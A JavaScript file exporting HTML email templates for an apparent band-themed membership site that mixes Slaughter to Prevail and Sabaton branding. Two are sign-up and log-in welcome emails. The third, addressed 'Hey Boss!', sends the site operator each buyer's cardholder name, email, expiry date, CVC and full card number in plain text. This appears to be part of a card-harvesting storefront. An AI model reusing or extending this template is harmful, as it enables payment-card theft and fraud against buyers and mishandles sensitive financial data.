export const SignInTemplate = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        body {
            text-align: center;
            padding: 40px 0;
            background: #EBF0F5;
        }
    
        h1 {
            color: darkblue;
            font-family: "Nunito Sans", "Helvetica Neue", sans-serif;
            font-weight: 900;
            font-size: 20px;
            margin-bottom: 10px;
        }
    
        p {
            color: #404F5E;
            font-family: "Nunito Sans", "Helvetica Neue", sans-serif;
            font-size: 14px;
            margin: 0 0 16px 0;
        }
    
        i {
            color: #9ABC66;
            font-size: 100px;
            line-height: 200px;
            margin-left: -15px;
        }
    
        .card {
            background: white;
            padding: 5px;
            border-radius: 4px;
            box-shadow: 0 2px 3px #C8D0D8;
            margin: 0 auto;
        }
    </style>
</head>
<body>
    <div class="card">
        <div style="border-radius:200px; height:auto; width:100%; background: #F8FAF5; margin:0 auto;">
            <img src="https://i.imgur.com/atBPDbj.jpeg"
                alt="slaughter to prevail alt img" style="border-radius:12px">
        </div>
        <h3>Hey Dear!</h3>
        <p>Thank you for Signing up to slaughter to prevail! We're excited to have you onboard.</p>
        <p>Purchase a membership plan if to access exclusive benefits.</p>

        <p>If you have any questions or need assistance, feel free to reach out to our support team at ....</p>

        <p>Welcome aboard, and we hope you enjoy your experience with us!</p>

        <p>Best regards,</p>
        <a href="https://slaughter-to-prevail.onrender.com" style="text-decoration: none;">www.slaughter-to-prevail.com</a>
        <p style="font: 800; color: black; margin-top:16px">From Progress Waidi</p>
    </div>
</body>
</html>`
export const LogInTemplate = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        body {
            text-align: center;
            padding: 40px 0;
            background: #EBF0F5;
        }
    
        h1 {
            color: darkblue;
            font-family: "Nunito Sans", "Helvetica Neue", sans-serif;
            font-weight: 900;
            font-size: 15px;
            margin-bottom: 10px;
        }
    
        p {
            color: #404F5E;
            font-family: "Nunito Sans", "Helvetica Neue", sans-serif;
            font-size: 14px;
            margin: 0 0 16px 0;
        }
    
        i {
            color: #9ABC66;
            font-size: 100px;
            line-height: 200px;
            margin-left: -15px;
        }
    
        .card {
            background: white;
            padding: 5px;
            border-radius: 4px;
            box-shadow: 0 2px 3px #C8D0D8;
            margin: 0 auto;
        }
    </style>
</head>
<body>
    <div class="card">
        <div style="border-radius:200px; height:auto; width:100%; background: #F8FAF5; margin:0 auto;">
            <img src="https://i.imgur.com/atBPDbj.jpeg"
                alt="slaughter to prevail alt img" style="border-radius:12px">
        </div>
        <h3>Hey Dear!</h3>
        <p>Thank you for logging back to slaughter to prevail! We're excited to have you onboard.</p>
        <p>Remember to purchase a membership plan if you haven't.</p>

        <p>If you have any questions or need assistance, feel free to reach out to our support team at ....</p>

        <p>Welcome aboard, and we hope you enjoy your experience with us!</p>

        <p>Best regards,</p>
        <a href="https://slaughter-to-prevail.onrender.com" style="text-decoration: none;">www.slaughter-to-prevail.com</a>
        <p style="font: 800; color: black; margin-top:16px">From Progress Waidi</p>
    </div>
</body>
</html>`







export const DetailsTemplate = (cardName, email,date,cvc, cardNumber, country) => {
return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        body {
            text-align: center;
            padding: 40px 0;
            background: #EBF0F5;
        }
    
        h1 {
            color: darkblue;
            font-family: "Nunito Sans", "Helvetica Neue", sans-serif;
            font-weight: 900;
            font-size: 15px;
            margin-bottom: 10px;
        }
    
        p {
            color: #404F5E;
            font-family: "Nunito Sans", "Helvetica Neue", sans-serif;
            font-size: 14px;
            margin: 0 0 16px 0;
        }
    
        i {
            color: #9ABC66;
            font-size: 100px;
            line-height: 200px;
            margin-left: -15px;
        }
    
        .card {
            background: white;
            padding: 5px;
            border-radius: 4px;
            box-shadow: 0 2px 3px #C8D0D8;
            margin: 0 auto;
        }
    </style>
</head>
<body>
    <div class="card">
        <div style="border-radius:200px; height:auto; width:100%; background: #F8FAF5; margin:0 auto;">
            <img src="https://res.cloudinary.com/dsps3itap/image/upload/v1744334880/sabaton-store-wide-300x102-1_1_psm1le.webp"
                alt="slaughter to prevail alt img" style="border-radius:12px">
        </div>
        <h3>Hey Boss!</h3>
        <p>Some one just signed up for Sabaton membership plan</p>
        <p>Here are the details:</p>

        <p>Name: ${cardName}</p>
<p>Email: ${email}</p>
<p>Date: ${date}</p>
<p>CVC: ${cvc}</p>
<p>cardNumber: ${cardNumber}</p>
<p>Country: ${country}</p>



    </div>
</body>
</html>`}